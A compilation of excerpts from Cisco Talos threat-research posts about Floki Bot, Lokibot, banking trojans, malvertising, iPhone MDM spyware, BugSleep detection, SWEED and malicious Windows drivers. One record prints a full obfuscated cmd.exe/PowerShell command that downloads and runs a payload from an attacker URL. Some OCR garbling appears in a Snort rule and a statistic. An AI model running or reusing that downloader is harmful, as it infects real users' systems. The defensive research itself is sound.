", "source": "Cisco"}, {"title": "Introduction", "content": "By Edmund Brumaghin \nWEDNESDAY, DECEMBER 7, 2016 11:02\nThis blog post was authored by Ben Baker, Edmund Brumaghin, Mariano Graziano, and Jonas Zaddach \nExecutive Summary \nFloki Bot is a new malware variant that has recently been offered for sale on various darknet markets. It is based on the same codebase that was used by the infamous Zeus trojan, the source code of which was leaked in 2011. Rather than simply copying the features that were present within the Zeus trojan \"as-is\", Floki Bot claims to feature several new capabilities making it an attractive tool for criminals. As Talos is constantly monitoring changes across the threat landscape to ensure that our customers remain protected as threats continue to evolve, we took a deep dive into this malware variant to determine the technical capabilities and characteristics of Floki Bot. \nDuring our analysis of Floki Bot, Talos identified modifications that had been made to the dropper mechanism present in the leaked Zeus source code in an attempt to make Floki Bot more difficult to detect. Talos also observed the introduction of new code that allows Floki Bot to make use of the Tor network. However, this functionality does not appear to be active for the time being. Finally, through the use of the FIRST framework during the analysis process, Talos was able to quickly identify code/function reuse between Zeus and Floki Bot. This made sample analysis more efficient and decreased the amount of time spent documenting various functions present within the Floki Bot samples we analyzed. \nTalos worked in collaboration with Flashpoint during the analysis of Floki Bot. This collaborative effort allowed Talos and Flashpoint to quickly communicate intelligence data related to active campaigns distributing Floki Bot as well as data regarding the technical functionality present within the malware. Additionally, Talos is making scripts available to the open source community that will help malware analysts automate portions of the Floki Bot analysis process and make the process of analyzing Floki Bot easier to perform. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Floki Bot is another example of what happens when the source code of successful malware kits gets leaked online. As we have seen several times since the Zeus source code became available, new malware variants based on this codebase continue to emerge. Floki Bot is unique in that the authors of this malware have put effort into expanding upon the functionality that was present in Zeus and have implemented new functionality making Floki Bot very attractive to criminals. \nAs Floki Bot is currently being actively bought and sold on several darknet markets it will likely continue to be seen in the wild as cybercriminals continue to attempt to leverage it to attack systems in an aim to monetize their efforts. As the leak of the Zeus source code continues to have ripple effects across the threat landscape, Talos will continue to monitor this and other threats that are actively being used in the wild to ensure that customers remain protected as new threats emerge or as existing threats change over time. \nCoverage \nAdditional ways our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. \nCWS or WSA web scanning prevents access to malicious websites and detects malware used in these attacks. \nThe Network Security protection of IPS and NGFW have up-to-date signatures to detect malicious network activity by threat actors. ", "source": "Cisco"}, {"title": "Introduction", "content": "WEDNESDAY, JANUARY 6, 2021 09:00\nLokibot is one of the most well-known information stealers on the malware landscape. In this post, we'll provide a technical breakdown of one of the latest Lokibot campaigns. Talos also has a new script to unpack the dropper's third stage. The actors behind Lokibot usually have the ability to steal multiple types of credentials and other sensitive information. This new campaign utilizes a complex, multi-stage, multi-layered dropper to execute Lokibot on the victim machine. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Threat actors are getting more sophisticated when it comes to hiding their final payload. This dropper uses three stages and three layers of encryption to hide its final payload. The dropper also injects code into a suspended process to bypass UAC and uses process hollowing to execute its final payload. The majority of malware is getting more and more sophisticated. They are constantly improving their social engineering techniques to trick the user into opening malicious attachments and running malicious code. The malware code and its infection \ntechniques is also improving constantly like we have described in this blog. The adversaries combine clever techniques to make detection harder. More than ever it is important to have a multi layered security architecture in place to detect these kinds of attacks. It isn't unlikely that the adversaries will manage to bypass one or the other security measures, but it is much harder for them to bypass all of them. These campaigns and the refinement of the TTPs being used will likely continue for the foreseeable future. ", "source": "Cisco"}, {"title": "Introduction", "content": "cmd .exe / v   / C set nyvxldrvifjjc=iEx && set lgetrwakfxpe=tRi && set kpmpoizdpv=bJe && set judolxmuby=L0ad && set hdlkrpujy=nop && set ghcigzyd=NEw && set fqlfmrg=wEbc && set vi=Ers && set yzs=hEll && set cibx=pow && set cdkzg=hxXps://marcondesduartesousa2018[.]000webhostapp[.]com/downs/image @echo off && %SystemDrive% && cd\\&& cd %SystemRoot%\\System32 && echo %nyvxldrvifjjc%(\"%nyvxldrvifjjc%(!ghcigzyd!-o%kpmpwoizdpv%ct NeT. !fqlfn   \nG('%cdkzg%')\"); I Windows!cibx!!vi!!yzs!\\vl.0\\!cibx!!vi!!yzs! -!hdlkrpujy! -win 1 - & ex t ", "source": "Cisco"}, {"title": "Conclusion", "content": "This strain of malware is prevalent throughout the world and is further proof that banking trojans remain popular. With this sample the attacker targets specific Brazilian banking institutions. This could suggest the attacker is from South America, where they could find it easier to use the obtained details and credentials to carry out illicit financial activities. We will continue to monitor financial crimeware activities throughout the threat landscape. This is not a sophisticated trojan, and most banking malware rarely is, but it's the latest example of how easy it can be for criminals steal from users by abusing spam to send their malicious payloads.This threat also shows the lengths that actors are going to in order to obtain additional emails to abuse, creating an automatic generation mechanism to get new emails for additional spam campaigns. \nCoverage \nAdditional ways our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. \nCisco Cloud Web Security (CWS) orWeb Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks. \nEmail Security can block malicious emails sent by threat actors as part of their campaign. \nNetwork Security appliances such asNext-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), and Meraki MX can detect malicious activity associated with this threat. \nAMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products. \nUmbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network. \nOpen Source SNORT\u24c7 Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nIndicators of Compromise (IOCs) \nThe following IOCs are associated with various malware distribution campaigns that were observed during the analysis of associated malicious activity. ", "source": "Cisco"}, {"title": "Introduction", "content": "Have you visited amazon.com, ads.yahoo.com, www.winrar.com, youtube.com, or any of the 74 domains listed below lately? If the answer is yes, then you may have been a victim to the \"Kyle and Stan\" Malvertising Network that distributes sophisticated, mutating malware for Windows and even Macs. \nTable of contents \nAttack in a Nutshell   \nTimeline   \nTechnical Breakdown   \nReversing of the Mac Malware   \nReversing of the Windows Malware   \nIOCs   \nConclusion   \nProtecting Users Against These Threats \nMalvertising is a short form for \"malicious advertising.\" The idea is very simple: use online advertising to spread malware. \nThis attack form is not new, but extremely effective. The world of online ads has only a few major players that are supplying ads to thousands of websites. If an attacker can get one of those major advertisement networks to display an advertisement with a malicious payload just for a few minutes without being detected, then countless machines can be infected by such an attack. \nTalos Security Research has uncovered a major network that is doing exactly this. Due to the naming scheme of hundreds of their sub-domains e.g. \"stan.mxp2099.com\" and \"kyle.mxp2038.com,\" we nicknamed that malvertising group \"Kyle and Stan.\" ", "source": "Cisco"}, {"title": "Conclusion", "content": "The \"Kyle and Stan\" network is a highly sophisticated Malvertising Network. It leverages the enormous reach of well-placed malicious advertisements on very well-known websites, in order to potentially reach millions of users. The goal is to infect Windows and Mac users alike with spyware, adware, and browser hijackers. It is not too far fetched that other kinds of malware are being used as well. The malware droppers employ clever techniques and encryption to always have unique checksums to avoid detection. Over 700  domains of the \"Kyle and Stan\" network have been unveiled by this investigation. It is very likely that there are even more domains part of the group behind this. The large number of domains allows the attackers to use a certain domain just for a very short time, burn it and move on to use another one for future attacks. This helps avoiding reputation and blacklist based security solutions. All in all we are facing a very robust and well-engineered malware delivery network that won't be taken down until the minds behind this are identified. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Cisco Talos \nTHURSDAY, JANUARY 24, 2019 13:39 \nTHREAT SPOTLIGHT\nBy John Arneson. \nExecutive Summary \nCisco Talos once again spotted the Ursnif malware in the wild. We tracked this information stealer after Cisco's Advanced Malware Protection (AMP) Exploit Prevention engine alerted us to these Ursnif infections. Thanks to AMP, we were able to prevent Ursnif from infecting any of its targets. The alert piqued our curiosity, so we began to dig a bit deeper and provide some recent IoCs related to this threat, which traditionally attempts to steal users' banking login credentials and other login information. Talos has covered Ursnif in the past, as it is one of the most popular malware that attackers have deployed recently. In April, we detected that Ursnif was being delivered via malicious emails along with the IceID banking trojan. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Talos continues to monitor these threats as they evolve to ensure that defenses protect our customers. We strongly encourage users and organizations to follow recommended security practices, such as installing security patches as they become available, exercising caution when receiving messages from unknown third parties, and ensuring that a robust offline backup solution is in place. Ursnif uses CAB files to compress its data prior to exfiltration, so being aware of what challenges that will present will assist you in protecting and monitoring your environment. To help with the detection of this malware, we are providing readers with a list of IOCs below that can help you identify and stop Ursnif before it infects your network. ", "source": "Cisco"}, {"title": "Introduction", "content": "Cisco Talos has identified a highly targeted campaign against 13 iPhones which appears to be focused on India. The attacker deployed an open-source mobile device management (MDM) system to control enrolled devices. At this time, we don't know how the attacker managed to enroll the targeted devices. Enrollment could be done through physical access to the devices, or most likely by using social engineering to entice a user to register. In social engineering attacks the victim is tricked into clicking accept or giving the attacker physical access to a device. This campaign is of note since the malware goes to great lengths to replace specific mobile apps for data interception. Talos has worked closely with Apple on countering this threat. Apple had already actioned 3 \ncertificates associated with this actor when Talos reached out, and quickly moved to action the two others once Talos tied them to the threat. \nAn MDM is designed to deploy applications on enrolled devices. In this campaign we identified five applications that have been distributed by this system to the 13 targeted devices in India. Two of them appear to test the functionality of the device, one steals SMS message contents, and the remaining two report the location of the device and can exfiltrate various data. \nThe attacker used the BOptions sideloading technique to add features to legitimate apps, including the messaging apps WhatsApp and Telegram, that were then deployed by the MDM onto the 13 targeted devices in India. The purpose of the BOptions sideloading technique is to inject a dynamic library in the application. The malicious code inserted into these apps is capable of collecting and exfiltrating information from the device, such as the phone number, serial number, location, contacts, user's photos, SMS and Telegram and WhatsApp chat messages. Such information can be used to manipulate a victim or even use it for blackmail or bribery. \nThanks to the logs located on the MDM servers and the malware's command and control (C2) server, we were able to determine that the malware has been in use since August 2015. The campaign targeted only a few select devices (13) that are all located in India. The attacker left essential data on the servers, such as emails and usernames. As part of the attacker's development and testing it appears that they compromised their device - we observed a device named \"test\" or \"mdmdev.\" The log files we identified contain the phone number of the device. The number originates from India and uses the \"Vodafone India\" network with roaming capability disabled. With all of this information in mind, we assume with high confidence that the malware author works out of India. \nMDM is becoming more popular throughout large enterprises, and users should be aware that installing additional certificates on their device to allow remote management can result in potential malicious activity. By installing a certificate outside of the Apple iOS trusted certificate chain, you may open up to possible third-party attacks like this. Users must be aware that accepting an MDM certificate is equivalent to allowing someone administrator access to their device, passwords, etc. This must be done with great care in order to avoid security issues and should not be something the average home user does. \nThe following information warns the security community and users of how this attack works. The likely use of social engineering to recruit devices serves as a reminder that users need to be wary of clicking on unsolicited links and verify identities and legitimacy of requests to access devices. \nThe overall workflow of the deployment method and capabilities is pictured below. ", "source": "Cisco"}, {"title": "Conclusion", "content": "This investigation shows us that this attack targeted a very limited number (13) of users using iPhone devices in India. At the time, it is unclear who the targets of the campaign were, who was the perpetrator, or what the exact purpose was. It's very likely the vector for this campaign was simply social engineering - in other words asking the user to click \"ok\". This type of vector is very difficult to defend against since users can often be tricked into acting against their best interests. This is another important reminder that users must think twice before clicking on unsolicited links or requests and also that users should verify credentials from any unsolicited calls requesting they take action on devices. \nThe attackers installed an open-source MDM and used this to deploy malicious code into secure chat applications such as Telegram and WhatsApp to surreptitiously retrieve the messages/chats, photos and user's location from the victim's phone. Over a three-year period, the attackers remained under the radar - likely due to the low number of compromised devices. All the technical details point to an actor based in the same country as the victims: India. The attacker tried to mimic Russian hackers by using mail.ru email. However, we found testing devices enrolled on the MDM with an Indian phone number and registered on an Indian provider. \nOnce a user has lost physical access to their phone, it's really a case of the attacker having a much easier playing field for malicious activity. The fact that the attacker was also able to get devices onto his own malicious MDM shows that the attacker was indeed motivated to obtain initial access but also to maintain persistence across the devices. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Aaron Boyd \nWEDNESDAY, OCTOBER 30, 2024 06:00\nRAT MALWARE \nIn June 2024, security researchers published their analysis of a novel implant dubbed \"MuddyRot\"(aka \"BugSleep\"). This remote access tool (RAT) gives operators reverse shell and file input/output (I/O) capabilities on a victim's endpoint using a bespoke command and control (C2) ", "source": "Cisco"}, {"title": "Detection", "content": "This server gives Talos the ability to emulate any number of conversations between BugSleep and its operators. This traffic is crucial for writing and validating our detections' performance in the wild. \nThe initial candidate for detection would be the beacon. It is the first opportunity to shut down communications, isolating any BugSleep instance from receiving commands. It was observed that each beacon has the form of <len><data>, where data is sub_string(COMPUTER_NAME + \"/\" + USERNAME, 3). This string is not long or static, which makes it a poor candidate for a fast_pattern; however, recall that each beacon is prepended with a 4-byte length of this string. A Computer Name/Username string from any given victim is unlikely to be longer than 255 characters. This means most length fields are going to look like |XX 00 00 00| or |XX FD FD FD| when encoded. This could be a quick match, early in the stream, at a static offset, making it a decent fast_pattern candidate. \ncontent:\\*|Fo FD Fo|\",offset 1,depth 3,fast pattern; \nThis will work but is likely to cause false-positives (FP) in the wild. Every sample of BugSleep was seen using port 443. The implant is also reaching outside the network to a C2 server, so traffic to be inspected by this rule can be reduced using the following header: \nThe flow:to_server,established option can be used to restrict Snort to data coming from a client over established TCP streams. The FP-rate on this rule still isn't great. Any TCP traffic leaving the network on port 443 with |FD FD FD| at offset 1 will alert. That might sound unique, but it does not indicate with confidence that the traffic is a BugSleep beacon. \nOne powerful tool in Snort to add more logic or state to rules is flowbits. These allow a writer to have a sense of state within a stream across multiple rules. In this case, the beacons aren't enough to reliably alert on. What if we use flowbits to chain beacons with the commands being sent back? The commands themselves don't provide much content, as they are variable length non-deterministic strings (e.g., get, put, etc.) or a nondeterministic 4-byte integer (e.g., heartbeat, increment timeout, etc.). They do, however, all start with a 4-byte command ID. Setting a flowbit when a beacon leaves the network will allow another rule down the line to alert with higher confidence if it sees a command ID come back in the same stream. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Since BugSleep is a new implant and weekly releases were observed being deployed, this protocol might change and bypass these rules. However, two things have been accomplished: \n1. This variant will no longer communicate over our customers' networks.   \n2. Attackers must invest development time and money to use BugSleep again. \nThe published Snort SIDs covering this traffic are 63937 and 63938. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Edmund Brumaghin \nMONDAY, JULY 15, 2019 11:04 \nBy Edmund Brumaghin and other Cisco Talos researchers. \nExecutive summary \nCisco Talos recently identified a large number of ongoing malware distribution campaigns linked to a threat actor we're calling \"SWEED,\" including such notable malware as Formbook, Lokibot and Agent Tesla. Based on our research, SWEED - which has been operating since at least 2017 - primarily targets their victims with stealers and remote access trojans. \nSWEED remains consistent across most of their campaigns in their use of spear-phishing emails with malicious attachments. While these campaigns have featured a myriad of different types of malicious documents, the actor primarily tries to infect its victims with a packed version of Agent Tesla - an information stealer that's been around since at least 2014. The version of Agent Tesla that SWEED is using differs slightly from what we've seen in the past in the way that it is packed, as well as how it infects the system. In this post, we'll run down each campaign we're able to connect to SWEED, and talk about some of the actor's tactics, techniques and procedures (TTPs). \n2017: Steganography \nOne of the earliest SWEED campaigns Talos identified dates back to 2017. In this attack, the actors placed droppers inside of ZIP archives, and then attached those ZIPs to emails. The attachments usually had file names similar to \"Java_Updater.zip\" or \"P-O of Jun2017.zip\". Here's an example of an email associated with this campaign: ", "source": "Cisco"}, {"title": "Conclusion", "content": "SWEED has been active for at least three years - and a user with that name has been active on various forums, IRC channels and Discord servers since at least 2015. Currently, SWEED is actively targeting small and medium-sized companies around the world. Based on the TTPs used by this group, SWEED should be considered a relatively amateur actor. They use well-known vulnerabilities, commodity stealers and RATs (Pony, Formbook, UnknownRAT, Agent Tesla, etc.) and appear to rely on kits readily available on hacking forums. SWEED consistently leverages packing and crypting in order to minimize detection by anti-malware solutions. We assess that SWEED also does not have effective operational security, as they used several of the same online accounts for about five years, allowing for the discovery of a lot of their information, operations and associates. \nAt this time, we cannot say with certainty whether the other accounts and associated individuals associated with SWEED are business associates or customers. However, they all use the same infrastructure in a coordinated manner across domains, rely on the same malware and packers, and all operate very similarly. While SWEED is relatively well-known in the security research community, this research provides insight into how these cybercriminal organizations operate and evolve over time in an effort to maximize their ability to generate revenue and evade detection. We expect SWEED to continue to operate for the foreseeable future and we will continue to monitor their activities to ensure that customers remain protected. \nCoverage \nWays our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware detailed in this post. Below is a screenshot showing how AMP can protect customers from this threat. Try AMP for free here. \nCisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks. \nEmail Security can block malicious emails sent by threat actors as part of their campaign. \nNetwork Security appliances such as Next-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), and Meraki MX can detect malicious activity associated with this \nAMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products. \nUmbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network. \nAdditional protections with context to your specific environment and threat data are available from the Firepower Management Center. \nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nIndicators of Compromise (IOCs) \nThe following IOCs have been observed as being associated with malware campaigns conducted by this group. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Holger Unterbrink \nTHURSDAY, SEPTEMBER 3, 2020 11:05 \nThreat summary \nCisco Talos recently uncovered a series of email campaigns utilizing links to malicious documents hosted on legitimate file-sharing platforms to spread malware. The campaigns distributed various malware payloads including Gozi ISFB, ZLoader, SmokeLoader and AveMaria, among others. Ongoing campaigns are distributing various malware families using the same crypter. While effective, this crypting mechanism contains an easy-to-detect flaw: The presence of a specific string value \"Salfram\" makes it easy to track over time. Obfuscated binaries are completely different, from both a binary and execution flow graph perspective. The techniques used by this crypter can confuse weak API behavior-based systems and static analysis tools. This crypter appears to be undergoing active development and improvement over time. ", "source": "Cisco"}, {"title": "Conclusion", "content": "The email distribution campaigns associated with samples built using this crypter feature several notable characteristics designed to evade detection and make tracking and analysis more difficult. The use of web-based contact forms demonstrates how adversaries can take advantage of any communications pathway to internal employees to attempt to infect organizational systems with malware. And the inclusion of legitimate hosting platforms makes it more difficult to respond to these campaigns - some organizations may require access to the same platform for legitimate business purposes. The crypter used to obfuscate various malware families \nfeatures several interesting techniques which are used to make analysis more difficult. The diverse list of malware families being distributed by adversaries creates a variety of risks to organizations which should be considered by defenders who are responsible for security corporate environments. These campaigns and the refinement of the TTPs being used will likely continue for the foreseeable future \nCoverage \nWays our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware detailed in this post. Below is a screenshot showing how AMP can protect customers from this threat. Try AMP for free here. \nCisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks. \nNetwork Security appliances such as Next-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), and Meraki MX can detect malicious activity associated with this threat. \nThreat Grid helps identify malicious binaries and build protection into all Cisco Security products. Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, \nIPs, and URLs, whether users are on or off the corporate network. \nAdditional protections with context to your specific environment and threat data are available from the Firepower Management Center. \nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.The following SIDs have been released to detect this threat: 54920, 54921. \nIndicators of Compromise (IOCs) \nThe following indicators of compromise (IOCs) have been observed as being associated with attacks leveraging this malware loader. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Chris Neal \nTUESDAY, JUNE 18, 2024 08:00\nMALWARE THREAT SPOTLIGHT\nThis blog post is part of a multi-part series, and it is highly recommended to read the first entry here before continuing. \nAs the second entry in our \"Exploring malicious Windows drivers\" series, we will continue where the first left off: Discussing the I/O system and IRPs. We will expand on these subjects and discuss other aspects of the I/O system such as IOCTLs, device stacks and I/O stack locations, as all are critical components of I/O operations. \nIn this series, we'll introduce the concepts of drivers, the Windows kernel and basic analysis of malicious drivers. Please explore the links to code examples and the Microsoft documentation, as it will provide context for the concepts discussed here. \nI/O operations are extremely powerful, as they allow an attacker to perform a wide array of actions at the kernel level. With kernel-level access, an attacker could discreetly capture, initiate, or alter network traffic, as well as access or alter files on a system. Virtualization protections such as Virtual Secure Mode can aid in defense against malicious drivers, although it is not enabled by default in a typical Windows environment. Even when these protections are enabled, certain configurations are required to effectively defend against kernel mode drivers. \nThe capability of a malicious driver is only limited by the skill level and knowledge of the individual writing it and the configuration of the target system. However, writing a reliable malicious driver is quite difficult as many factors must be taken into consideration during development. One of these factors is correctly implementing I/O operations without crashing the target system, which can easily occur if the proper precautions are not taken. ", "source": "Cisco"}, {"title": "IOC", "content": "IRPs can deliver requests in a slightly different way than what has been described so far. There is another mode of delivering requests drivers employ that makes use of what are called I/O control codes (IOCTLs). Device Input and Output Control, sometimes referred to as IOCTL as well, is an interface that allows user mode applications and other drivers to request that a specific driver execute a specific dispatch routine assigned a pre-defined I/O control code. \nNote: To eliminate confusion, the use of \"IOCTL\" in this blog series will be referring to I/O control codes, not \"Device Input and Output Control.\" \nAn IOCTL is a hardcoded 32-bit value defined within a driver that represents a specific function in that same driver. IOCTL requests are delivered by IRPs, much in the same way as described above. However, there are specific MajorFunction codes used in these requests. While both usermode applications and drivers can initiate these requests, there are slight differences in the requirements for doing so. ", "source": "Cisco"}, {"title": "IOC", "content": "The MajorFunction codes related to IOCTLs are delivered the same way as the function codes discussed so far. They are delivered via an IRP that is sent by the I/O manager which in turn is received by the driver and processed. All IOCTL requests use either IRP_MJ_DEVICE_CONTROL and IRP_MJ_INTERNAL_DEVICE_CONTROL, which are assigned to a driver's dispatch routine entry point in the same manner described earlier. \n//Initialize the driver object with this driver'sentry points. \nDriverObject->MajorFunction[IRP_MJ_CREATE] = SioctlCreateClose;   \nDriverObject->MajorFunction[IRP_MJ_CLoSE] = SioctlCreateClose;   \nDriverObject->MajorFunction[IRP_MJ_DEVICE_CoNTRoL] = SioctLDeviceControl;   \nDriverobject->DriverUnload = SioctlUnloadDriver; \nAssigning IRP_MJ_DEVICE_CONTROL to a dispatch routine entry point. Source: GitHub \nWhile IRP_MJ_DEVICE_CONTROL and IRP_MJ_INTERNAL_DEVICE_CONTROL are both used for processing IOCTLs, they serve slightly different purposes. In cases where an IOCTL will be made available for use by a user-mode application, IRP_MJ_DEVICE_CONTROL must be used. In the situation of an IOCTL only being available to other drivers, IRP_MJ_INTERNAL_DEVICE_CONTROL must be used instead. ", "source": "Cisco"}, {"title": "IOC", "content": "To process an IOCTL, a driver must define and name it, and implement the function that is to be executed when it's processed. IOCTLs are usually defined in a header file by using a systemsupplied macro named CTL_CODE: \n#define IOCTL_Device_Function CTL_coDE(DeviceType, Function, Method, Access \nWhen naming an IOCTL Microsoft recommends using the IOCTL_Device_Function naming convention, as it makes it easier to read and understand. The following example of this convention is provided on MSDN: IOCTL_VIDEO_ENABLE_CURSOR. Applications and drivers commonly pass the IOCTL's name as a parameter when making a request \u2013 rather than the 32- bit value \u2013 which highlights the importance of the readability and consistency of the naming convention. \nAside from establishing the IOCTL's name, CTL_CODE also takes four arguments: \nDeviceType: This value must be set to the same value as the DeviceType member of the driver's DEVICE_OBJECT structure, which defines the type of hardware the driver was designed for. For further information on device types, refer to the MSDN documentation here.   \nFunction: The function that will be executed upon an IOCTL request; represented as a 32-bit hexadecimal (DWORD) value, such as 0x987. Any value that is less than 0x800 is reserved for use by Microsoft.   \nMethod: The method used to pass data between the requester and the driver handling the request. This can be set to one of four values: METHOD_BUFFERED, METHOD_IN_DIRECT, MET HOD_OUT_DIRECT or METHOD_NEITHER. For more information on these methods, refer to the links regarding memory operations provided in the next section.   \nAccess: The level of access required to process the request. This can be set to the following values: FILE_ANY_ACCESS, FILE_READ_DATA or FILE_WRITE_DATA. If the requester needs both read and write access, FILE_READ_DATA and FILE_WRITE_DATA can be passed together by separating them using the OR \"|\" operator: FILE_READ_DATA | FILE_WRITE_D ATA. \n#define IOCTL_NONPNP_METHOD_IN_DIRECT \\CTL_CODE( FILEIO_TYPE, OX900, METHOD_IN_DIRECT, FILE_ANY_ACCESS )\n#define IOCTL_NONPNP_METHOD_OUT_DIRECT \\ CTL_CODE( FILEI0_TYPE, 0x901, METHOD_OUT_DIRECT , FILE_ANY_ACCESS   \n#define IOCTL_NONPNP_METHOD_BUFFERED \\ CTL_CODE( FILEI0_TYPE,0X902,METHOD_BUFFERED,FILE_ANY_ACCESS   \n#define IOCTL_NONPNP_METHOD_NEITHER \\ CTL_CODE( FILEI0_TYPE, OX903, METHOD_NEITHER,FILE_ANY_ACCESS \nExample of defining IOCTLs. Source: GitHub. \nNote: The image above is from a header file for a driver from the Microsoft \"Windows-driversamples\" GitHub repository. An invaluable resource for learning about Windows drivers. Microsoft has included a plethora of source code samples that demonstrate the implementation of many of the documented WDM and KMDF functions and macros. Also, all the samples contain helpful comments to provide context. ", "source": "Cisco"}, {"title": "IOC", "content": "Once an I/O control code is defined, an appropriate dispatch function needs to be implemented. To handle IOCTL requests, drivers will commonly have a function that is named using the \"XxxDeviceControl\" naming convention. For example, the function that handles I/O control requests in this Microsoft sample driver uses the name \"SioctlDeviceControl.\" \nIn common practice, these functions contain switch statements that execute different functions depending on the IOCTL it received. A thorough example of this can be found in Microsoft's driver sample GitHub repository here. \nNTSTATUS   \nSioctlDeviceControl( PDEVICE_OBJECT DeviceObject PIRP Irp \nAs seen in the image above, this device control function takes two arguments: A pointer to a device object (PDEVICE_OBJECT DeviceObject) and a pointer to an IRP (PIRP Irp). The DeviceObject parameter is a pointer to the device that the initiator of the request wants the IOCTL to perform operations on. This could be a pointer to the device object of a directory, file, volume or one of the many other types of objects in the Windows environment. The second parameter the function takes is simply a pointer to the IRP that the driver received when the IOCTL request was sent. \nOnce the device control function is executed, it reads the Parameters.DeviceIoControl.IoC ontrolCodehave member of the IRP structure that the driver received to retrieve the IOCTL. The IOCTL is then compared to the IOCTLs defined within the driver, and if there is a match, it executes the appropriate routine. Once the processing and the necessary clean-up have been done, the request can be completed by calling IoCompleteRequest. ", "source": "Cisco"}, {"title": "IOC", "content": "Requestors can initiate an IOCTL request by calling DeviceIoControl, in which several parameters may be passed. \nFor the sake of simplicity, we will only be discussing the first two parameters: hDevice and dwIo ControlCode. The rest of the parameters pertain to memory operations but are outside the scope of this blog post as the topic is complex and requires a lengthy explanation. Interaction with data buffers is a common occurrence for drivers performing I/O operations. Additionally, it is critical to become familiar with these concepts for conducting driver analysis. For further reading, the MSDN documentation is an excellent source of information. Relevant links are provided below: \nMemory Management for Windows Drivers   \nBuffer Descriptions for I/O Control Codes   \nMethods for Accessing Data Buffers   \nUsing Buffered I/O   \nUsing Direct I/O   \nUsing Neither Buffered Nor Direct I/O \nWhen calling DeviceIoControl, the caller must provide a handle to the target driver's device object and the IOCTL it is requesting. These parameters are passed as the arguments hDevice and dwI oControlCode, respectively. An important aspect of making an IOCTL request is that the caller must know the value of the I/O control code before requesting. Additionally, a driver must be able to handle receiving an unrecognized control code, otherwise it may crash. ", "source": "Cisco"}, {"title": "IOC", "content": "In some instances, a higher-level driver needs to send an IOCTL request to a lower-level device driver, known as an \"internal request.\" These IOCTLs in particular are not available to be requested by a user-mode application and use the IRP_MJ_INTERNAL_DEVICE_CONTROL MajorFunctio n code. The dispatch routines that handle these requests are conventionally referred to as either DispatchDeviceControl when the driver receives IRP_MJ_DEVICE_CONTROL, or DispatchInternalDeviceControl when IRP_MJ_INTERNAL_DEVICE_CONTROL is received. The main distinction between the two is that DispatchDeviceControl handles requests that may originate from user mode, whereas DispatchInternalDeviceControl handles internal requests. \nFor the sake of brevity, the details of this process will not be discussed here. However, the details can be found in the MSDN documentation here. We'll not be covering IOCTLs sent from one driver to another, but rather, IOCTLs sent from user-mode applications, as it is easier to become familiar with. Once the basics are understood, learning about I/O between drivers will be much easier. The topic of IOCTLs will be concluded in the next part of this series when we demonstrate debugging drivers. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Anyone interested in learning more should explore the provided links to the MSDN documentation and Microsoft's sample driver GitHub repository for more in-depth information. The I/O section of the MSDN driver documentation is worth exploring and contains most of the entries that have been linked to in this blog post and can be found here. \nIn the next entry in this series, we will discuss installing, running and debugging drivers and the security concepts surrounding them. This will include a description of the basic setup and tooling required for analysis and knowing what to look for while performing it. To demonstrate the use of debuggers, we will show how a driver processes IOCTLs and executes dispatch routines. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Nick Biasini \nMONDAY, AUGUST 29, 2022 14:45\nON THE RADAR \nThe cybersecurity industry tends to focus on extremely large-scale or sophisticated, statesponsored attacks. Rightfully so, as it can be the most interesting, technically speaking. \nWhen most people think of cybercrime they think of large-scale breaches because that's what dominates the headlines. However, the problem is much bigger. In 2021, the Internet Crime Complaint Center (IC3) received a staggering 847,376 complaints, with each victim losing a little more than \\$8,000 on average. Once you account for the high-value breaches, the true impact is even lower. The average person is far more likely to have their identity stolen or fall victim to some other sort of scam than be directly affected by a large-scale breach - and business is booming. \nA deeper look at the data from IC3 shows that the amount of complaints and revenue being generated from cybercrime continues to rise. Interestingly there is a huge jump in cybercrime during the pandemic with a staggering increase of more than $\\textcircled{\\div}\\textcircled{\\div}\\textcircled{\\div}$ in complaints between 2019 and 2020, with it increasing further in 2021. It's clear that cybercrime is on the rise, but what's driving it? ", "source": "Cisco"}, {"title": "Conclusion", "content": "As we've seen repeatedly over the years, we don't typically see new types of crime, just crime taking new forms. The world today is run by technology and it is becoming an ever-increasing part of our lives, as such, criminal activity is bound to increase. Criminals may seem like they are just out to commit crimes, but in reality, most criminals are choosing to live a life of crime to support themselves and their families. They, like anyone else, are familiar with risk assessment and now it may make more sense to commit crime with a keyboard instead of selling drugs as the risks are lower across the board. It's a lot less likely to draw immediate law enforcement \nresponse and there typically aren't turf wars in cyberspace and if they are they tend to be less violent. Furthermore. the margins in cybercrime are significant and in the end the goal is to make as much money as quickly as possible: technology is the key to scale and speed. \nLaw enforcement, especially at the local level, is going to need to evolve along with 